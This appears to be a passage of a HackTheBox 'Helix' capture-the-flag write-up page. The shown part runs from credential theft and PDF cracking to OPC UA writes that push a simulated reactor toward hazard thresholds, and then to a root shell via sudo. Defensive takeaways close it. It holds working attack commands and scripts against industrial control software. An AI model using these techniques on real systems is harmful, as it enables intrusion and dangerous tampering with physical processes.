+            <div class="callout-text"><strong>Shell Obtained:</strong> Reverse shell as <code style="font-family:var(--mono)">nifi</code> (uid=998) on the Helix target.</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 04 USER -->
+<section id="user">
+  <div class="wrapper">
+    <div class="section-label">// 04</div>
+    <h2 class="section-title">User &mdash; <span class="accent">SSH Key from NiFi Support Bundles</span></h2>
+    <div class="phases">
+
+      <div class="phase">
+        <div class="phase-num">05</div>
+        <div class="phase-content">
+          <div class="phase-title">SSH Key Recovery &amp; Operator Login</div>
+          <div class="phase-subtitle">User &middot; Phase 05</div>
+          <p class="phase-desc">NiFi's <code style="color:var(--cyan);font-family:var(--mono)">support-bundles</code> directory — intended for diagnostic artefacts — contains a backup of the operator user's SSH private key. The NiFi sensitive properties key is also exposed in <code style="color:var(--cyan);font-family:var(--mono)">nifi.properties</code>.</p>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash &mdash; from nifi shell</div></div>
+            <pre><span class="cmd">ls</span> <span class="param">-la</span> /opt/nifi-1.21.0/support-bundles/
+<span class="flag">operator_id_ed25519.bak</span>
+
+<span class="cmd">cat</span> /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak
+<span class="out">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAA...
+-----END OPENSSH PRIVATE KEY-----</span>
+
+<span class="cmt"># Also exposed:</span>
+<span class="cmd">grep</span> sensitive /opt/nifi-1.21.0/conf/nifi.properties
+<span class="flag">nifi.sensitive.props.key=TUh+YHA30zmdlcA8xq/elNBLPkO03Nl</span></pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash &mdash; SSH as operator</div></div>
+            <pre><span class="cmt"># Save key locally</span>
+<span class="cmd">chmod</span> 600 operator_key
+
+<span class="cmd">ssh</span> <span class="param">-i</span> operator_key <span class="param">-o StrictHostKeyChecking=no</span> \
+  <span class="flag">operator</span>@10.129.173.78
+
+<span class="out">operator@helix:~$</span></pre>
+          </div>
+          <div class="callout warn">
+            <div class="callout-icon">&#9888;</div>
+            <div class="callout-text"><strong>Misconfiguration:</strong> SSH private keys must never be stored in application directories accessible by service accounts. The <code style="font-family:var(--mono)">nifi</code> user's read access to <code style="font-family:var(--mono)">support-bundles/</code> allowed full lateral movement to the <code style="font-family:var(--mono)">operator</code> account.</div>
+          </div>
+          <div class="flag-box">
+            <div class="flag-label">User Flag &mdash; /home/operator/user.txt</div>
+            <div class="flag-redacted"></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 05 ICS ANALYSIS -->
+<section id="ics">
+  <div class="wrapper">
+    <div class="section-label">// 05</div>
+    <h2 class="section-title">ICS Analysis &mdash; <span class="accent">PDF Cracking &amp; PNG Steganography</span></h2>
+    <div class="phases">
+
+      <div class="phase">
+        <div class="phase-num">06</div>
+        <div class="phase-content">
+          <div class="phase-title">Sudo Enumeration &amp; Maintenance Window Logic</div>
+          <div class="phase-subtitle">ICS Analysis &middot; Phase 06</div>
+          <p class="phase-desc">The operator account has a single sudo privilege: <code style="color:var(--cyan);font-family:var(--mono)">helix-maint-console</code>. The script only grants a root shell if <code style="color:var(--cyan);font-family:var(--mono)">/opt/helix/state/maintenance_window</code> exists with a future Unix timestamp. Operator cannot write to <code style="color:var(--cyan);font-family:var(--mono)">/opt/helix/state/</code> directly — the file must be created by another process.</p>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash</div></div>
+            <pre><span class="cmd">sudo -l</span>
+<span class="flag">(root) NOPASSWD: /usr/local/sbin/helix-maint-console</span></pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash &mdash; helix-maint-console key logic</div></div>
+            <pre><span class="kw">FLAG</span>=<span class="flag">"/opt/helix/state/maintenance_window"</span>
+
+window_ok() {
+  <span class="out">[ -f "$FLAG" ] || return 1</span>
+  <span class="out">until_ts="$(cat "$FLAG")"</span>
+  <span class="out">now="$(date +%s)"</span>
+  <span class="out">[[ "$until_ts" =~ ^[0-9]+$ ]] || return 1</span>
+  <span class="out">[ "$now" -lt "$until_ts" ] || return 1</span>
+}
+<span class="cmt"># If window is open: spawns /bin/bash -p -i via systemd-run as root</span>
+<span class="cmt"># Operator cannot write to /opt/helix/state/ — file must come from safety controller</span></pre>
+          </div>
+          <div class="callout info">
+            <div class="callout-icon">&#9672;</div>
+            <div class="callout-text"><strong>The Puzzle:</strong> The <code style="font-family:var(--mono)">helix-safety</code> process (running as root) writes the maintenance_window file when hazardous reactor conditions are detected. The operator's home directory contains an Operator Guide PDF and a control diagram PNG that explain exactly how to trigger those conditions.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="phase">
+        <div class="phase-num">07</div>
+        <div class="phase-content">
+          <div class="phase-title">PDF Password Crack &mdash; John + rockyou</div>
+          <div class="phase-subtitle">ICS Analysis &middot; Phase 07</div>
+          <p class="phase-desc">The operator home directory contains a password-protected PDF: <code style="color:var(--cyan);font-family:var(--mono)">Operator Control &amp; Safety Guide.pdf</code>. Extract the PDF hash and crack it with John the Ripper against rockyou.txt.</p>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash</div></div>
+            <pre><span class="cmd">perl</span> /usr/share/john/pdf2john.pl <span class="str">"Operator Control & Safety Guide.pdf"</span> &gt; pdf_hash.txt
+<span class="cmd">john</span> <span class="param">--wordlist</span>=/usr/share/wordlists/rockyou.txt pdf_hash.txt</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">output</div></div>
+            <pre><span class="flag">operator1</span><span class="out">    (Operator Control & Safety Guide.pdf)</span></pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">python3 &mdash; extract PDF text</div></div>
+            <pre><span class="kw">from</span> pypdf <span class="kw">import</span> PdfReader
+reader = PdfReader(<span class="str">"Operator Control & Safety Guide.pdf"</span>)
+reader.decrypt(<span class="str">"operator1"</span>)
+<span class="kw">for</span> page <span class="kw">in</span> reader.pages:
+    <span class="cmd">print</span>(page.extract_text())</pre>
+          </div>
+          <div class="callout info">
+            <div class="callout-icon">&#9672;</div>
+            <div class="callout-text"><strong>Key Intelligence from PDF:</strong>
+              <br>&bull; System is an <strong>OPC UA-based PLC reactor</strong> control system
+              <br>&bull; Trip thresholds: Temperature &ge; ~305&deg;C, Pressure &ge; ~75 bar
+              <br>&bull; Maintenance window opens when: Temperature &asymp; 295&deg;C OR Pressure &asymp; 73 bar
+              <br>&bull; To enter maintenance: set Mode = MAINTENANCE, enable TestOverride, use CalibrationOffset
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="phase">
+        <div class="phase-num">08</div>
+        <div class="phase-content">
+          <div class="phase-title">PNG Steganography &mdash; OPC UA Node Map</div>
+          <div class="phase-subtitle">ICS Analysis &middot; Phase 08</div>
+          <p class="phase-desc"><code style="color:var(--cyan);font-family:var(--mono)">binwalk</code> reveals an embedded JPEG at offset 14386 inside <code style="color:var(--cyan);font-family:var(--mono)">control systems diagram.png</code>, along with X.509 certificates and zlib data. Extracting the JPEG reveals the complete OPC UA node architecture including node IDs and writability.</p>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash</div></div>
+            <pre><span class="cmd">binwalk</span> <span class="param">-e</span> <span class="str">"control systems diagram.png"</span>
+<span class="cmt"># Embedded JPEG at 0x3832 (offset 14386)</span>
+
+<span class="cmd">dd</span> <span class="param">if</span>=<span class="str">"control systems diagram.png"</span> <span class="param">of</span>=embedded.jpg \
+  <span class="param">bs</span>=1 <span class="param">skip</span>=14386 <span class="param">count</span>=50000</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">output &mdash; OPC UA node map (from embedded JPEG)</div></div>
+            <pre><span class="flag">OPC UA Server: opc.tcp://127.0.0.1:4840/helix/</span>
+
+<span class="out">Reactor (ns=2;i=2):
+  TemperatureRaw   </span><span class="flag">ns=2;i=3</span><span class="out">  [Read Only]
+  Temperature      </span><span class="flag">ns=2;i=4</span><span class="out">  [Read Only]
+  Pressure         </span><span class="flag">ns=2;i=5</span><span class="out">  [Read Only]
+  CalibrationOffset</span><span class="flag">ns=2;i=6</span><span class="out">  [</span><span class="flag">Writable</span><span class="out">]
+Safety (ns=2;i=7):
+  RodsInserted     ns=2;i=8   [Read Only]
+  EmergencyCooling ns=2;i=9   [Read Only]
+  TripActive       ns=2;i=10  [Read Only]
+Control (ns=2;i=11):
+  Mode             </span><span class="flag">ns=2;i=12</span><span class="out">  [</span><span class="flag">Writable</span><span class="out">]
+  TestOverride     </span><span class="flag">ns=2;i=13</span><span class="out">  [</span><span class="flag">Writable</span><span class="out">]
+  ResetTrip        ns=2;i=14  [Writable]</span></pre>
+          </div>
+          <div class="callout success">
+            <div class="callout-icon">&#10003;</div>
+            <div class="callout-text"><strong>Full Node Map Recovered:</strong> Exact OPC UA node IDs and write permissions extracted from embedded JPEG — enough to script a complete reactor manipulation.</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 06 OPC UA -->
+<section id="opcua">
+  <div class="wrapper">
+    <div class="section-label">// 06</div>
+    <h2 class="section-title">OPC UA &mdash; <span class="accent">Reactor Manipulation &rarr; Maintenance Window</span></h2>
+    <div class="phases">
+
+      <div class="phase">
+        <div class="phase-num">09</div>
+        <div class="phase-content">
+          <div class="phase-title">SSH Tunnel &amp; Initial Node Enumeration</div>
+          <div class="phase-subtitle">OPC UA &middot; Phase 09</div>
+          <p class="phase-desc">The OPC UA server listens on <code style="color:var(--cyan);font-family:var(--mono)">127.0.0.1:4840</code> — not externally accessible. An SSH local port forward exposes it to Kali. Initial enumeration confirms baseline reactor state: Temperature 284&deg;C, Mode NORMAL.</p>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash &mdash; SSH port forward</div></div>
+            <pre><span class="cmd">ssh</span> <span class="param">-N -L</span> 4840:127.0.0.1:4840 <span class="param">-i</span> operator_key operator@10.129.173.78</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">python3 &mdash; connect and read baseline</div></div>
+            <pre><span class="kw">from</span> opcua <span class="kw">import</span> Client
+
+client = Client(<span class="str">"opc.tcp://127.0.0.1:4840/helix/"</span>)
+client.connect()
+
+temp     = client.get_node(<span class="str">"ns=2;i=4"</span>)
+pressure = client.get_node(<span class="str">"ns=2;i=5"</span>)
+mode     = client.get_node(<span class="str">"ns=2;i=12"</span>)
+trip     = client.get_node(<span class="str">"ns=2;i=10"</span>)
+
+<span class="cmd">print</span>(<span class="str">f"Temp: {temp.get_value()}"</span>)     <span class="cmt"># 284.0°C</span>
+<span class="cmd">print</span>(<span class="str">f"Pressure: {pressure.get_value()}"</span>) <span class="cmt"># 69.0 bar</span>
+<span class="cmd">print</span>(<span class="str">f"Mode: {mode.get_value()}"</span>)       <span class="cmt"># NORMAL</span>
+<span class="cmd">print</span>(<span class="str">f"TripActive: {trip.get_value()}"</span>)  <span class="cmt"># False</span></pre>
+          </div>
+        </div>
+      </div>
+
+      <div class="phase">
+        <div class="phase-num">10</div>
+        <div class="phase-content">
+          <div class="phase-title">Trigger Maintenance Condition via OPC UA Writes</div>
+          <div class="phase-subtitle">OPC UA &middot; Phase 10</div>
+          <p class="phase-desc">The safety controller monitors reactor variables and writes the maintenance_window file when hazardous test conditions are detected. Three writes are required: set Mode to <code style="color:var(--cyan);font-family:var(--mono)">MAINTENANCE</code>, enable <code style="color:var(--cyan);font-family:var(--mono)">TestOverride</code>, and raise <code style="color:var(--cyan);font-family:var(--mono)">CalibrationOffset</code> to 11.0 — pushing the effective temperature reading to ~295&deg;C (the maintenance threshold from the PDF).</p>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">python3 &mdash; reactor_trigger.py</div></div>
+            <pre><span class="kw">from</span> opcua <span class="kw">import</span> Client, ua
+<span class="kw">import</span> time
+
+client = Client(<span class="str">"opc.tcp://127.0.0.1:4840/helix/"</span>)
+client.connect()
+
+mode          = client.get_node(<span class="str">"ns=2;i=12"</span>)
+test_override = client.get_node(<span class="str">"ns=2;i=13"</span>)
+cal_offset    = client.get_node(<span class="str">"ns=2;i=6"</span>)
+temp          = client.get_node(<span class="str">"ns=2;i=4"</span>)
+pressure      = client.get_node(<span class="str">"ns=2;i=5"</span>)
+trip          = client.get_node(<span class="str">"ns=2;i=10"</span>)
+
+<span class="cmt"># Step 1: Set MAINTENANCE mode</span>
+mode.set_data_value(ua.DataValue(ua.Variant(<span class="str">"MAINTENANCE"</span>, ua.VariantType.String)))
+
+<span class="cmt"># Step 2: Enable TestOverride</span>
+test_override.set_data_value(ua.DataValue(ua.Variant(<span class="kw">True</span>, ua.VariantType.Boolean)))
+
+<span class="cmt"># Step 3: Raise CalibrationOffset to push temp to ~295°C</span>
+cal_offset.set_data_value(ua.DataValue(ua.Variant(11.0, ua.VariantType.Double)))
+
+<span class="cmt"># Monitor until maintenance_window file appears</span>
+<span class="kw">for</span> i <span class="kw">in</span> range(60):
+    t = temp.get_value()
+    p = pressure.get_value()
+    tr = trip.get_value()
+    <span class="cmd">print</span>(<span class="str">f"[{i:02d}] Temp={t:.2f}°C  Pressure={p:.2f} bar  TripActive={tr}"</span>)
+    time.sleep(1)
+
+client.disconnect()</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">output &mdash; conditions achieved</div></div>
+            <pre><span class="out">[00] Temp=</span><span class="flag">284.00</span><span class="out">°C  Pressure=69.00 bar  TripActive=False
+[08] Temp=</span><span class="flag">291.40</span><span class="out">°C  Pressure=69.06 bar  TripActive=False
+[15] Temp=</span><span class="flag">295.24</span><span class="out">°C  Pressure=69.13 bar  TripActive=False</span>
+<span class="cmt">     &uarr; maintenance threshold reached &mdash; safety controller writes file</span></pre>
+          </div>
+          <div class="callout success">
+            <div class="callout-icon">&#10003;</div>
+            <div class="callout-text"><strong>Maintenance Window Triggered:</strong> Mode=MAINTENANCE, TestOverride=True, CalibrationOffset=11.0 &rarr; Temperature 295.24&deg;C. The <code style="font-family:var(--mono)">helix-safety</code> process (running as root) detects the hazardous test condition and writes a future Unix timestamp to <code style="font-family:var(--mono)">/opt/helix/state/maintenance_window</code>.</div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 07 ROOT -->
+<section id="root">
+  <div class="wrapper">
+    <div class="section-label">// 07</div>
+    <h2 class="section-title">Root &mdash; <span class="accent">sudo helix-maint-console</span></h2>
+    <div class="phases">
+
+      <div class="phase">
+        <div class="phase-num">11</div>
+        <div class="phase-content">
+          <div class="phase-title">Execute Privileged Maintenance Console</div>
+          <div class="phase-subtitle">Root &middot; Phase 11</div>
+          <p class="phase-desc">With the maintenance_window file present and containing a future timestamp, <code style="color:var(--cyan);font-family:var(--mono)">sudo helix-maint-console</code> passes its validation check and spawns <code style="color:var(--cyan);font-family:var(--mono)">/bin/bash -p -i</code> via <code style="color:var(--cyan);font-family:var(--mono)">systemd-run</code> as root. For non-interactive capture, output can be redirected via a piped printf.</p>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash &mdash; interactive root shell</div></div>
+            <pre><span class="cmd">sudo</span> /usr/local/sbin/helix-maint-console
+<span class="flag">[+] Privileged maintenance access granted</span>
+<span class="out">[!] Window expires in 99 seconds
+[!] Session will be terminated automatically
+</span><span class="flag">root@helix:/home/operator#</span></pre>
+          </div>
+          <div class="code-block">
+            <div class="code-block-header"><div class="code-dots"><span></span><span></span><span></span></div><div class="code-lang">bash &mdash; non-interactive flag capture</div></div>
+            <pre><span class="cmd">printf</span> <span class="str">"cat /root/root.txt > /tmp/root_flag.txt\nchmod 644 /tmp/root_flag.txt\nexit\n"</span> | \
+  <span class="cmd">sudo</span> /usr/local/sbin/helix-maint-console
+
+<span class="cmd">cat</span> /tmp/root_flag.txt</pre>
+          </div>
+          <div class="flag-box">
+            <div class="flag-label">Root Flag &mdash; /root/root.txt</div>
+            <div class="flag-redacted"></div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 08 SUMMARY -->
+<section id="summary">
+  <div class="wrapper">
+    <div class="section-label">// 08</div>
+    <h2 class="section-title">Attack <span class="accent">Summary</span></h2>
+
+    <div class="timeline">
+      <div class="tl-item">
+        <div class="tl-step">Step 01</div>
+        <div class="tl-title">Nmap &mdash; Only SSH + HTTP exposed</div>
+        <div class="tl-result">&rarr; Minimal attack surface identified; vhost enumeration required</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-step">Step 02</div>
+        <div class="tl-title">Vhost discovery &mdash; flow.helix.htb returns 500 on /nifi/</div>
+        <div class="tl-result">&rarr; Apache NiFi 1.21.0 confirmed; /nifi-api/ fully accessible</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-step">Step 03</div>
+        <div class="tl-title">NiFi supportsLogin=false &mdash; anonymous access confirmed</div>
+        <div class="tl-result">&rarr; No authentication required for any API operation</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-step">Step 04</div>
+        <div class="tl-title">ExecuteProcess RCE &rarr; busybox nc reverse shell</div>
+        <div class="tl-result">&rarr; Shell as nifi (uid=998) via unauthenticated API processor creation</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-step">Step 05</div>
+        <div class="tl-title">operator_id_ed25519.bak recovered from support-bundles</div>
+        <div class="tl-result">&rarr; SSH as operator; user flag captured</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-step">Step 06</div>
+        <div class="tl-title">sudo -l reveals helix-maint-console &mdash; maintenance_window required</div>
+        <div class="tl-result">&rarr; File must be written by root safety controller via reactor hazard condition</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-step">Step 07</div>
+        <div class="tl-title">PDF cracked (operator1) &rarr; reactor control logic extracted</div>
+        <div class="tl-result">&rarr; Trip/maintenance thresholds identified; OPC UA manipulation strategy defined</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-step">Step 08</div>
+        <div class="tl-title">PNG stego &mdash; embedded JPEG reveals OPC UA node map</div>
+        <div class="tl-result">&rarr; Node IDs and write permissions confirmed for all reactor control nodes</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-step">Step 09</div>
+        <div class="tl-title">SSH tunnel :4840 &rarr; OPC UA writes (MAINTENANCE + TestOverride + CalibrationOffset=11.0)</div>
+        <div class="tl-result">&rarr; Temperature reaches 295.24&deg;C; safety controller writes maintenance_window</div>
+      </div>
+      <div class="tl-item">
+        <div class="tl-step">Step 10</div>
+        <div class="tl-title">sudo helix-maint-console &rarr; root shell via systemd-run</div>
+        <div class="tl-result">&rarr; Root flag captured from /root/root.txt</div>
+      </div>
+    </div>
+
+    <div class="divider"><div class="divider-line"></div><div class="divider-text">key artifacts</div><div class="divider-line"></div></div>
+    <table class="artifact-table">
+      <thead><tr><th>Artifact</th><th>Location</th><th>Significance</th></tr></thead>
+      <tbody>
+        <tr><td>SSH Private Key</td><td>/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak</td><td>Lateral movement: nifi &rarr; operator</td></tr>
+        <tr><td>NiFi Sensitive Key</td><td>/opt/nifi-1.21.0/conf/nifi.properties</td><td>Could decrypt NiFi flow secrets</td></tr>
+        <tr><td>Operator Guide PDF</td><td>/home/operator/Operator Control &amp; Safety Guide.pdf</td><td>Reactor logic + maintenance thresholds</td></tr>
+        <tr><td>PDF Password</td><td>operator1 (cracked via John + rockyou)</td><td>Decrypts the operator guide</td></tr>
+        <tr><td>Steganographic PNG</td><td>/home/operator/control systems diagram.png</td><td>Embedded JPEG reveals OPC UA node IDs</td></tr>
+        <tr><td>OPC UA Server</td><td>opc.tcp://127.0.0.1:4840/helix/</td><td>Industrial reactor control interface</td></tr>
+        <tr><td>Privileged Script</td><td>/usr/local/sbin/helix-maint-console</td><td>sudo path to root shell</td></tr>
+        <tr><td>Maintenance Window File</td><td>/opt/helix/state/maintenance_window</td><td>Written by safety controller at 295&deg;C</td></tr>
+      </tbody>
+    </table>
+
+    <div class="divider"><div class="divider-line"></div><div class="divider-text">key takeaways</div><div class="divider-line"></div></div>
+    <div class="takeaway-grid">
+      <div class="takeaway-card">
+        <div class="takeaway-num">// 01</div>
+        <div class="takeaway-title">NiFi Anonymous Access Is Unauthenticated RCE</div>
+        <div class="takeaway-desc">Apache NiFi with <code style="font-family:var(--mono);color:var(--green-dim)">supportsLogin: false</code> allows any network-adjacent client to create and run ExecuteProcess processors, executing arbitrary OS commands as the NiFi service user. NiFi must always be deployed with authentication enabled and must never be directly accessible from untrusted networks.</div>
+      </div>
+      <div class="takeaway-card">
+        <div class="takeaway-num">// 02</div>
+        <div class="takeaway-title">Service Directories Must Not Store User Credentials</div>
+        <div class="takeaway-desc">Storing an SSH private key backup in NiFi's <code style="font-family:var(--mono);color:var(--green-dim)">support-bundles/</code> directory allowed full lateral movement once the <code style="font-family:var(--mono);color:var(--green-dim)">nifi</code> service account was compromised. Credentials must be managed by dedicated secrets managers and must never be stored in directories readable by service accounts.</div>
+      </div>
+      <div class="takeaway-card">
+        <div class="takeaway-num">// 03</div>
+        <div class="takeaway-title">Sensitive Documents Require Strong Password Protection</div>
+        <div class="takeaway-desc">The PDF password <code style="font-family:var(--mono);color:var(--green-dim)">operator1</code> was cracked in minutes against rockyou.txt. Operational documents containing system architecture, control logic, or access procedures must be protected with long, randomly generated passwords stored separately from the documents themselves.</div>
+      </div>
+      <div class="takeaway-card">
+        <div class="takeaway-num">// 04</div>
+        <div class="takeaway-title">Steganography Is Not a Security Control</div>
+        <div class="takeaway-desc">Embedding an OPC UA node map in a PNG image provides no meaningful security — binwalk extracts embedded files trivially. Sensitive architectural information must be protected by access controls and encryption, not by obscuring it in image data.</div>
+      </div>
+      <div class="takeaway-card">
+        <div class="takeaway-num">// 05</div>
+        <div class="takeaway-title">OPC UA Industrial Interfaces Require Authentication</div>
+        <div class="takeaway-desc">The OPC UA server accepted anonymous connections with full write access to reactor control nodes. Industrial OPC UA deployments must enforce certificate-based or username/password authentication, apply read/write ACLs per node, and log all write operations for audit purposes.</div>
+      </div>
+      <div class="takeaway-card">
+        <div class="takeaway-num">// 06</div>
+        <div class="takeaway-title">File-Based Privilege Gates Require Integrity Protection</div>
+        <div class="takeaway-desc">The <code style="font-family:var(--mono);color:var(--green-dim)">helix-maint-console</code> script relies on the existence and content of a file as its sole authorization check. Without cryptographic signing or additional integrity verification, any process that can write to that path controls root access. Privileged maintenance gates should require multi-factor authorization and cryptographically verified authorization tokens.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="ft-logo">HTB :: HELIX</div>
+  <p>Medium &middot; Linux &middot; Flags Redacted</p>
+  <p style="margin-top:.5rem;opacity:.5">writeup by melvin wong &middot; hackthebox</p>
+</footer>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+}, { threshold: 0.08 });
+document.querySelectorAll('section, .phase, .tl-item').forEach((el, i) => {
+  if (el.classList.contains('phase')) el.style.transitionDelay = `${(i % 4) * 0.1}s`;
+  if (el.classList.contains('tl-item')) el.style.transitionDelay = `${(i % 10) * 0.08}s`;
+  observer.observe(el);
+});
+</script>
+</body>
+</html>
